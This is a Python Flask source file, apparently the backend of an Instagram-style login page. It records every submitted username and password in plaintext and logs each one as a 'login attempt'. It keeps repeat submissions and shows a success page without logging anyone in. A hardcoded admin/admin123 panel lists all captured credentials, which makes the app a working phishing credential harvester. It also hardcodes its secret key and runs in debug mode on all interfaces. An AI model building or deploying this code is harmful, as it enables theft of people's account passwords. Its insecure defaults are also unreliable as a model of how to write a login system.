import os
from flask import Flask, render_template, request, redirect, url_for, flash
from flask_login import LoginManager, login_required
import logging
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from datetime import datetime
from functools import wraps

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
app = Flask(__name__)

# Configure database
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///database.db"
app.secret_key = 'instagram_clone_secret_key'

# Initialize the app with the extension
db.init_app(app)

# Import models after db initialization
from models import User

def check_admin(username, password):
    return username == "admin" and password == "admin123"

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_admin(auth.username, auth.password):
            return 'Could not verify your access level for that URL.\n' \
                   'You have to login with proper credentials', 401, {
                       'WWW-Authenticate': 'Basic realm="Login Required"'
                   }
        return f(*args, **kwargs)
    return decorated_function

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    logging.info(f"Received login attempt for username: {username}")

    # Handle duplicate usernames by appending a timestamp
    base_username = username
    counter = 0
    while True:
        try:
            # Create new user entry
            new_user = User(
                username=username,
                password_hash=password,  # In a real app, this should be hashed
                email=username if '@' in username else f"{username}@example.com"
            )

            db.session.add(new_user)
            db.session.commit()
            logging.info(f"Successfully stored credentials for username: {username}")
            break
        except Exception as e:
            if 'UniqueViolation' in str(e):
                # If username exists, append timestamp
                counter += 1
                username = f"{base_username}_{counter}"
                db.session.rollback()
                continue
            else:
                logging.error(f"Error storing credentials: {str(e)}")
                db.session.rollback()
                return "Error storing credentials", 500

    # Redirect to success page instead of showing credentials
    return render_template('success.html')

@app.route('/admin')
@admin_required
def admin():
    try:
        users = User.query.order_by(User.created_at.desc()).all()
        logging.info(f"Retrieved {len(users)} users for admin panel")
        return render_template('admin.html', users=users)
    except Exception as e:
        logging.error(f"Error accessing admin panel: {str(e)}")
        return "Error accessing admin panel", 500

# Create tables
with app.app_context():
    db.create_all()
    logging.info("Database tables created successfully")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)